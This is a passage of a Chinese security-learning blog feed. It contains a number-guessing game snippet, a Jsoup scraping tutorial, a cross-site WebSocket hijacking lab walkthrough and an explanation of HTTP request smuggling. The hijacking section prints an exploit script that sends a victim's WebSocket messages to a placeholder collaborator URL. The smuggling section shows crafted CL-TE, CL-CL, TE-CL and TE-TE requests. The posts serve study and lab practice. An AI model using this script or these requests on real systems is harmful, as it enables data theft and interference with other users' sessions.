lastResult.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;Congratulations! You got it right!&#x27;</span>;<br>    lastResult.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">&#x27;green&#x27;</span>;<br>    <span class="hljs-comment">//清除“高了 / 低了”信息框的内容</span><br>    lowOrHi.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-title function_">setGameOver</span>();<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (guessCount === <span class="hljs-number">10</span>) &#123;<br>    lastResult.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;!!!GAME OVER!!!&#x27;</span>;<br>    lowOrHi.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-title function_">setGameOver</span>();<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    lastResult.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;Wrong!&#x27;</span>;<br>    lastResult.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">&#x27;red&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (userGuess &lt; randomNumber) &#123;<br>      lowOrHi.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;Last guess was too low!&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (userGuess &gt; randomNumber) &#123;<br>      lowOrHi.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;Last guess was too high!&#x27;</span>;<br>    &#125;<br>  &#125;<br><br>  guessCount++;<br>  guessField.<span class="hljs-property">value</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>  guessField.<span class="hljs-title function_">focus</span>();<br>&#125;<br><span class="hljs-comment">//对该按钮进行事件监听</span><br>guessSubmit.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, checkGuess);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">setGameOver</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">//禁用表单输入</span><br>  guessField.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>;<br>  guessSubmit.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>;、<br>  <span class="hljs-comment">//新建一个重置按钮</span><br>  resetButton = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;button&#x27;</span>);<br>  resetButton.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;Start new game&#x27;</span>;<br>  <span class="hljs-comment">//监听重置按钮</span><br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">append</span>(resetButton);<br>  resetButton.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, resetGame);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">resetGame</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">//重置猜测次数</span><br>  guessCount = <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">//选择class=resultParas中的全部</span><br>  <span class="hljs-keyword">const</span> resetParas = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;.resultParas p&#x27;</span>);<br>  <span class="hljs-comment">//遍历重置</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> resetPara <span class="hljs-keyword">of</span> resetParas) &#123;<br>    resetPara.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>  &#125;<br>  <span class="hljs-comment">//移除按钮</span><br>  resetButton.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">removeChild</span>(resetButton);<br>  <span class="hljs-comment">//启用输入框</span><br>  guessField.<span class="hljs-property">disabled</span> = <span class="hljs-literal">false</span>;<br>  guessSubmit.<span class="hljs-property">disabled</span> = <span class="hljs-literal">false</span>;<br>  guessField.<span class="hljs-property">value</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>  guessField.<span class="hljs-title function_">focus</span>();<br><br>  lastResult.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">&#x27;white&#x27;</span>;<br>  <span class="hljs-comment">//重置随机数</span><br>  randomNumber = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/10/16/Jsoup%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/"/>
    <url>/2022/10/16/Jsoup%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Jsoup爬虫入门"><a href="#Jsoup爬虫入门" class="headerlink" title="Jsoup爬虫入门"></a>Jsoup爬虫入门</h1><p>粗略的了解一下Java的Jsoup爬虫入门</p><p>首先肯定是导包</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20221016200033.png"></p><p>这次我们拿京东的搜索商品来举例，我们搜索java，然后观察地址栏的url</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20221016200201.png"></p><p><code>https://search.jd.com/Search?keyword=java</code>，关键url就是这一段</p><p>首先了解一下jsoup的Document类，Document是一个装载html的文档类，即通过我们传入的url获取整个页面的html内容</p><p>然后我们看一下爬虫代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.jsoup.Jsoup;<br><span class="hljs-keyword">import</span> org.jsoup.nodes.Document;<br><span class="hljs-keyword">import</span> org.jsoup.nodes.Element;<br><span class="hljs-keyword">import</span> org.jsoup.select.Elements;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jsoup</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><span class="hljs-comment">//导入url</span><br>        String url=<span class="hljs-string">&quot;https://search.jd.com/Search?keyword=java&quot;</span>;<br>        <span class="hljs-comment">//通过url获取整个网页的html内容</span><br>        <span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> Jsoup.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url), <span class="hljs-number">30000</span>);<br>        <span class="hljs-comment">//获取J_goodsList获取这个货物元素</span><br>        Element element=document.getElementById(<span class="hljs-string">&quot;J_goodsList&quot;</span>);<br>        <span class="hljs-comment">//通过li获取每一个商品元素</span><br>        Elements elements=element.getElementsByTag(<span class="hljs-string">&quot;li&quot;</span>);<br>        <span class="hljs-comment">//遍历每一个货物</span><br>        <span class="hljs-keyword">for</span>(Element el:elements)&#123;<br>            String price=el.getElementsByClass(<span class="hljs-string">&quot;p-price&quot;</span>).eq(<span class="hljs-number">0</span>).text();<br>            String title=el.getElementsByClass(<span class="hljs-string">&quot;p-name&quot;</span>).eq(<span class="hljs-number">0</span>).text();<br><br>            System.out.println(<span class="hljs-string">&quot;======================================&quot;</span>);<br>            System.out.println(price);<br>            System.out.println(title);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过前端代码找到自己需要的东西所对应的元素即可</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20221016201908.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>WebSocket劫持（CSWSH）</title>
    <link href="/2022/09/22/WebSocket%E5%8A%AB%E6%8C%81/"/>
    <url>/2022/09/22/WebSocket%E5%8A%AB%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<h1 id="WebSocket劫持（CSWSH）"><a href="#WebSocket劫持（CSWSH）" class="headerlink" title="WebSocket劫持（CSWSH）"></a>WebSocket劫持（CSWSH）</h1><p>在了解WebSocket劫持之前，首先需要了解一下什么是WebSocket</p><h2 id="WebSocket介绍"><a href="#WebSocket介绍" class="headerlink" title="WebSocket介绍"></a>WebSocket介绍</h2><p>在传统的HTTP协议中，因为HTTP协议是一个请求－响应协议，他是不支持长连接的，请求必须先由浏览器发给服务器，服务器才能响应这个请求，所以有一个缺点，就是通信请求只能由客户端发起，服务器只能被动响应，这样如果需要多人聊天，联机游戏的话，就非常的麻烦，需要使用轮询，即浏览器定时发送请求进行询问，但这样就会造成很大的带宽浪费，也会给服务器造成压力</p><p>Web Socket是HTML5新增的协议，他与HTTP有一定的交集，但是却是一个新的协议，是一个<strong>持久化</strong>的协议，是一个基于<strong>TCP</strong>的应用层通信协议，它的目的是在浏览器和服务器之间建立一个不受限的双向通信的通道，建立无限制的全双工通信，在Web即时通信中，WebSocket可以提高网络吞吐量，减少延迟，减轻服务器负担</p><p>简单的举个例子，HTTP的生命周期通过Request来界定，也就是一个Request 一个Response，服务端返回一个响应后，这个HTTP请求事务就已经完成了。即使这个HTTP连接处于keep-alive的状态，它们之间的每一个工作(事务)依然是请求与响应，请求来了，响应回去了。这个事务就结束了。所以通常来说，HTTP协议是一个基于事务性的通信协议，请记住 Request &#x3D; Response ， 在HTTP中永远是这样，也就是说一个request只能有一个response，而且这个response也是被动的，不能主动发起</p><p>但是如果有一些需要即时通讯的需求的话，HTTP协议就会比较的麻烦，最典型的场景就是聊天室</p><p>而WebSocket呢，首先Websocket是基于HTTP协议的，或者说<strong>借用</strong>了HTTP的协议来完成一部分握手，建立连接后，会始终保持连接状态。客户端和服务端可以随时随地的通过一个已经建立的WebSocket互发消息，没有所谓事务性的特点，源于其双向全双工的通信特点，在一个WebSocket连接中，服务端是可以主动发送消息的哦，这一点已经完全区别于HTTP协议了</p><p>通常发送JSON格式的文本，较为容易处理</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220920110524.png"></p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220921152750.png"></p><h3 id="WebSocket协议"><a href="#WebSocket协议" class="headerlink" title="WebSocket协议"></a>WebSocket协议</h3><p>在建立连接时，需要利用HTTP协议进行连接建立</p><p>首先由浏览器发起请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http">GET ws://localhost:3000/ws/chat HTTP/1.1 //请求的地址由ws://开头 <br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Upgrade</span><span class="hljs-punctuation">: </span>websocket //表示即将要转换成WebSocket连接<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Upgrade //表示浏览器通知服务器即将升级连接<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:3000 //供服务器验证是否许可<br><span class="hljs-attribute">Sec-WebSocket-Protocol</span><span class="hljs-punctuation">: </span>chat, superchat<br><span class="hljs-attribute">Sec-WebSocket-Key</span><span class="hljs-punctuation">: </span>sN9cRrP/n9NdMgdcy2VJFQ==//用于标识这个连接<br><span class="hljs-attribute">Sec-WebSocket-Version</span><span class="hljs-punctuation">: </span>13<br></code></pre></td></tr></table></figure><p>然后由浏览器进行回应，表示已成功建立连接</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">101</span> Switching Protocols //<span class="hljs-number">101</span>表示本次HTTP协议即将被更改<br><span class="hljs-attribute">Upgrade</span><span class="hljs-punctuation">: </span>websocket<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Upgrade<br><span class="hljs-attribute">Sec-WebSocket-Protocol</span><span class="hljs-punctuation">: </span>chat<br><span class="hljs-attribute">Sec-WebSocket-Accept</span><span class="hljs-punctuation">: </span>fFBooB7FAkLlXgRSz0BT3v4hq5s=<br></code></pre></td></tr></table></figure><p>需要网络连接保持打开状态，可用于在任一方向上发送WebSocket消息。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">ws.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Peter Wiener&quot;</span>); <span class="hljs-comment">//客户端发送消息</span><br>&#123;<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;Hal Pline&quot;</span>,<span class="hljs-string">&quot;content&quot;</span>:<span class="hljs-string">&quot;I wanted to be a Playstation growing up, not a device to answer your inane questions&quot;</span>&#125; <span class="hljs-comment">//通常JSON格式回复信息</span><br></code></pre></td></tr></table></figure><p>同时需要client-side JavaScript 用于定义链接</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">&quot;wss://normal-website.com/chat&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>WebSocket劫持其实极其类似于CSRF（Cross-site request forgery），举个例子说一下什么是CSRF</p><ul><li>假设用户登录到他的网上银行 <code>www.mybank.com</code></li><li>用户从中进行汇款，<code>mybank.com</code>规定进行以GET的方式进行请求发送<code>www.mybank.com/transfer?to=&lt;SomeAccountnumber&gt;;amount=&lt;SomeAmount&gt;</code>to为要汇款的账号，amount为转账金额</li><li>用户访问<code>www.cute-cat-pictures.org</code>，却不知道这是一个恶意网站</li><li>如果该站点的所有者知道上述请求的形式，并且正确地猜测您已登录<code>mybank.com</code>，则他们可以在其页面上添加一个请求，并以img或其他标签包裹，例如<code>&lt;img&gt;www.mybank.com/transfer?to=123456;amount=10000&lt;/img&gt;</code></li><li>当用户访问<code> www.cute-cat-pictures.org</code>页面，那么你的浏览器会发出以上的请求</li><li>银行无法识别请求的来源：你的网络浏览器将发送请求以及你的<code>www.mybank.com</code>上的cookie，并且看起来完全合法</li></ul><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>为了最大程度的防止这种攻击的产生，CSRF采用了Token进行验证，所有的用户请求都携带一个CSRF攻击者无法获取到的Token。服务器通过校验请求是否携带正确的Token，来把正常的请求和攻击的请求区分开，进行防范</p><p>这个Token当然不能再存在cookie里，不然容易再次被黑客利用，一般是存在服务器端的session中，本地以cookie的形式保存sessionid，在用户访问该网站的时候，通过sessionid获取token，然后写到本地</p><h2 id="WebSocket劫持的影响"><a href="#WebSocket劫持的影响" class="headerlink" title="WebSocket劫持的影响"></a>WebSocket劫持的影响</h2><p>伪装成受害者用户执行未经授权的操作：与 CSRF 一样，攻击者可以向服务器端应用程序发送任意消息。如果应用程序使用客户端生成的 WebSocket 消息来执行任何敏感操作，则攻击者可以跨域生成合适的消息并触发这些操作，比如在线炒股、在线交易之类的操作</p><p>检索用户可以访问的敏感数据：与 CSRF 不同，跨站点 WebSocket 劫持使攻击者可以通过被劫持的 WebSocket 与易受攻击的应用程序进行双向交互。如果应用程序使用服务器生成的 WebSocket 消息向用户返回任何敏感数据，则攻击者可以拦截这些消息并捕获受害用户的数据</p><h2 id="一个实例"><a href="#一个实例" class="headerlink" title="一个实例"></a>一个实例</h2><p>这边使用Burp的一个官方靶场进行演示，该靶场有使用WebSocket协议实现的在线实时聊天功能</p><p>靶场地址：<a href="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab">https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab</a></p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220921154512.png"></p><h3 id="Burp-Collaborator-Client"><a href="#Burp-Collaborator-Client" class="headerlink" title="Burp Collaborator Client"></a>Burp Collaborator Client</h3><p>简单介绍一下Burp Collaborator Client，可以将他简单理解为是Burp给我们提供的一个外部服务器，在进行盲注跨站、盲打xss的时候，如果服务器不回显详细信息，就无法准确判断是否存在漏洞，解决办法就是需要一个独立的外部服务器，在插入恶意脚本的时候带上这个服务器的地址，如果存在漏洞的话，就回去访问我们的外部服务器，进而记录各种信息，有利于我们判读漏洞的存在，有点类似于DNS外带回显的意思，而Burp 给我们提供了这个外部服务器，叫 Collaborator</p><p>正常情况的交互如下图，提交payload后，服务器响应response信息，中间没有其他服务器的参与，一般叫做带内攻击</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220922140854.png"></p><p>而在加入了外部服务器后，payload的发送过程是一样的，在回显的时候会经过外部服务器</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220922140731.png"></p><p>下面这个图可以大体的代表 collaborator 的大体工作流程，首先 burp 发送 payload 给目标程序，以下图为例，其 payload 为外部的服务器 url 地址，随后目标程序若进行解析或则调用等，则会去访问这个地址，而这个地址是我们的 collaborator 服务器，所以 collaborator 会记录其访问的请求信息以及响应信息和 dns 的信息。而当 burp 发送 payload 后，就会不断的去问 collaborator 服务器，你收到我发送的 payload 交互了么，这时 collaborator 就会将交互信息告诉 burp，burp 最后进行报告</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220922141306.png"></p><p>先进入burp的靶场，看一下&#x2F;chat的报文，没有CSRF令牌</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220922191722.png"></p><p>然后打开burp的工具</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220922184107.png"></p><p>然后在burp的exploit server中填写相关信息，创建一个包含ws攻击的网页</p><p>burp官方给的一个exp</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>  <span class="hljs-keyword">var</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">&#x27;wss://your-websocket-url&#x27;</span>);<br>  ws.<span class="hljs-property">onopen</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    ws.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;READY&quot;</span>);<br>  &#125;;<br>  ws.<span class="hljs-property">onmessage</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://your-collaborator-url&#x27;</span>, &#123;<span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>, <span class="hljs-attr">body</span>: event.<span class="hljs-property">data</span>&#125;);<br>  &#125;;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220922185055.png"></p><p>然后在burp的工具中获取外带服务器收到的信息，即可获取其密码</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220922190433.png"></p>]]></content>
    
    
    <categories>
      
      <category>自主学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP请求走私</title>
    <link href="/2022/09/16/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <url>/2022/09/16/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP请求走私"><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式，用以绕过安全控制并获得未经授权的访问，执行恶意活动，最早在 2005 年被提出</p><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>在正常情况下用户发出的 HTTP 请求的流动如下图：</p><p>可以看到在长度标记正常的情况下，蓝色和绿色的数据包被正确的区分，不同用户的数据在后端被正确还原</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220914161102.png"></p><p>在整个过程中，最关键的是<strong>前置服务器和后端服务器应当在 HTTP 请求的边界划分上达成一致</strong>，否则就会导致下图所示的异常：</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220914162020.png"></p><p>（图中橙色的部分为走私的内容）</p><p>当我们向代理服务器发送一个比较模糊（接收到的实际长度和报文中标的长度不同）的 HTTP 请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个 HTTP 请求</p><p>即前端服务器和后端服务器对客户端传入的数据理解不一致的情况，即 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 标头。然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，<strong>就算是走私的请求</strong>，当该部分对正常用户的请求造成了影响之后，就实现了 HTTP 走私攻击</p><h2 id="Content-Length和Transfer-Encoding"><a href="#Content-Length和Transfer-Encoding" class="headerlink" title="Content-Length和Transfer-Encoding"></a>Content-Length和Transfer-Encoding</h2><h3 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h3><p>HTTP状态码，代表 HTTP消息长度, 用<strong>十进制数字</strong>表示. 若Content-Length比实际消息长度短, 请求被截断, 而且下一个请求解析出现错乱.。Content-Length比实际消息长度长，请求将无响应直到超时</p><h3 id="Transfer-Encoding-chunked"><a href="#Transfer-Encoding-chunked" class="headerlink" title="Transfer-Encoding: chunked"></a><strong>Transfer-Encoding: chunked</strong></h3><p>代表数据以一系列分块的形式进行发送.。Content-Length 首部在这种情况下应该不被发送。 在每一个分块的开头需要添加当前分块的长度, 以<strong>十六进制</strong>的形式表示，后面紧跟着 \r\n(回车换行) , 之后是分块本身, 后面也是\r\n。 终止块是一个常规的分块, 不同之处在于其长度为0。后面跟两个\r\n</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li><p>CL-TE：前端服务器使用 <code>Content-Length</code> 头，后端服务器使用 <code>Transfer-Encoding</code> 头</p><p>前置服务器认为 <code>Content-Length</code> 优先级更高（或者根本就不支持 <code>Transfer-Encoding</code> ） ，后端认为 <code>Transfer-Encoding</code> 优先级更高</p></li></ul><p>所谓CL-TE，顾名思义就是收到包含Content-Length和Transfer-Encoding这两个请求头的请求时，前端代理服务器按照Content-Length这一请求头定界，而后端服务器则以Transfer-Encoding请求头为标准</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>16<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br>0<br><br><span class="language-ebnf"><span class="hljs-attribute">chunkedcode</span></span><br></code></pre></td></tr></table></figure><p>前端服务器处理Content-Length头并确定请求主体长度为16个字节，直到chunkedcode结束。此请求将转发到后端服务器</p><p>后端服务器处理Transfer-Encoding标头，因此将消息体视为使用分块编码。它处理第一个块，它被称为零长度，因此被视为终止请求。缓冲区内还剩下chunkedcode，由于存在pipeline技术，后端服务器将这些字节视为队列中下一个请求的开始</p><p>如果此时其他用户此时发送了一个 GET 请求，就会与 chunkedcode 拼接成一个畸形的 chunkedcodeGET，造成服务器解析异常</p><ul><li>CL-CL：前端和后端服务器都支持 <code>Content-Length</code> 标头</li></ul><p>攻击者可以恶意构造一个特殊的请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>5<br>123<br>A<br></code></pre></td></tr></table></figure><p>后端服务器获取到的数据包长度为5。当读取完前5个字符后，后端服务器认为该请求已经读取完毕，然后发送出去。而此时的缓冲区去还剩余一个字母 A，对于后端服务器来说，这个 A是下一个请求的一部分，但是还没有传输完毕</p><p>此时恰巧有一个其他的正常用户对服务器进行了请求，则该A字母会拼凑到下一个正常用户请求的前面，攻击在此展开</p><ul><li>TE-CL：前端服务器使用 <code>Transfer-Encoding</code> 标头，后端服务器使用 <code>Content-Length</code> 标头。</li></ul><p>这种情况则属于前端服务器处理Transfer-Encoding请求头，而后端服务器处理Content-Length请求头</p><p>构造数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br>Host:example.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>3<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br>chunkedcode<br>0<br></code></pre></td></tr></table></figure><p>前端服务器处理Transfer-Encoding请求头，因此将消息体视为使用分块编码，处理第一块时，有11个字节，直到chunkedcodede的最后一个字节。开始处理第二个块，第二块是0个字节，视为终止请求。此时把请求转发到后端。而后端则在11处完成了对第一个数据包的读取，chunkedcodern0为下一个数据包的开始部分</p><ul><li>TE-TE：前端和后端服务器都支持 <code>Transfer-Encoding</code> 标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。</li></ul><p>前端服务器处理第一个Transfer-Encoding请求头，后端服务器处理第二个Transfer-Encoding请求头。</p><p>构造数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http">Host:example.com<br><span class="hljs-attribute">Content-length</span><span class="hljs-punctuation">: </span>3<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><span class="hljs-attribute">Transfer-encoding</span><span class="hljs-punctuation">: </span>error<br>chunkedcode<br>0<br></code></pre></td></tr></table></figure><p>这里是用了两个Transfer-Encoding 字段，并且第二个 TE 字段值为错误值，这里 前端服务器选择对第一个 Transfer-Encoding进行处理，整个请求正常，原封不动转发给后端服务器，而后端服务器则以第二个Transfer-Encoding 字段进行优先处理，而第二个Transfer-Encoding 字段非标准值，根据RPC规范，则会取Content-Length字段进行处理，这样这个请求就会被拆分为两个请求。</p><p>参考：<a href="https://xz.aliyun.com/t/7501">https://xz.aliyun.com/t/7501</a></p><p><a href="https://www.anquanke.com/post/id/210036">https://www.anquanke.com/post/id/210036</a></p>]]></content>
    
    
    <categories>
      
      <category>自主学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/08/02/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/2022/08/02/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
